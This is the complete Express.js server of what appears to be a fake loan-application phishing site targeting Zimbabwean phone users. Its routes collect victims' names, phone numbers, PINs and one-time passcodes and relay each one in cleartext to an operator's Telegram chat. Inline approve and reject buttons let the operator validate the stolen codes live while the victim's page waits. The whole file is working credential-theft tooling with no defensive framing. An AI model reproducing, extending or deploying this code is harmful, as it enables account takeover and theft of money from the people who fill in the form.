require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files from frontend
const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

// Explicitly serve style.css
app.get('/style.css', (req, res) => {
  res.sendFile(path.join(frontendPath, 'style.css'), {
    headers: { 'Content-Type': 'text/css' }
  });
});

// Config
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
  console.error('Please set these in Render or .env file.');
}

// In-memory store
const applications = {};

// ─── Telegram helper ───
async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data);
    }
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// ─── API Routes ───

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Submit application
app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  const appId = `${data.phone}_${Date.now()}`;

  applications[appId] = {
    ...data,
    pinStatus: 'pending',
    otpStatus: 'pending',
    pinAttempts: 0,
    maxPinAttempts: 3,
    pinBlockedUntil: null,
    createdAt: new Date().toISOString()
  };

  const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${appId}\n📱 Phone: +263${data.phone}\n💰 Amount: $${data.loanAmount}\n📅 Duration: ${data.loanDuration} days\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId: appId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId: appId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, applicationId: appId, status: 'waiting_pin' });
});

// Send PIN
app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  // Check block
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
  }
  // Reset if block expired
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  }

  app.pin = pin;
  app.pinStatus = 'pending';

  const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

// Send OTP
app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otp = otp;
  app.otpStatus = 'pending';

  const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

// Resend OTP
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otpStatus = 'pending';
  const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📌 New OTP requested.\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'otp_resent' });
});

// Status check (with PIN attempts & block info)
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  } else if (req.params.step === 'otp') {
    status = app.otpStatus;
  }

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  // Handle inline callback (YES/NO buttons)
  if (update.callback_query) {
    const query = update.callback_query;
    const { action, step, applicationId } = JSON.parse(query.data);
    const app = applications[applicationId];
    if (!app) return res.sendStatus(200);

    if (step === 'PIN') {
      if (action === 'YES') {
        app.pinStatus = 'approved';
      } else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (step === 'OTP') {
      if (action === 'YES') {
        app.otpStatus = 'approved';
      } else {
        app.otpStatus = 'rejected';
      }
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${action}` })
    });

    await sendTelegramMessage(`📌 *Status Update*\n🆔 ID: ${applicationId}\n📋 ${step}: ${action}`);
    return res.sendStatus(200);
  }

  // Handle regular messages (admin commands)
  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`📊 Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = '📋 Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phone} (PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      } else if (text === '/status') {
        const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
        await sendTelegramMessage(`Webhook: ${webhookInfo.result?.url || 'not set'}`);
      }
    }
  }

  res.sendStatus(200);
});

// Fallback: serve index.html for any non-API route
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📁 Serving frontend from: ${frontendPath}`);
});
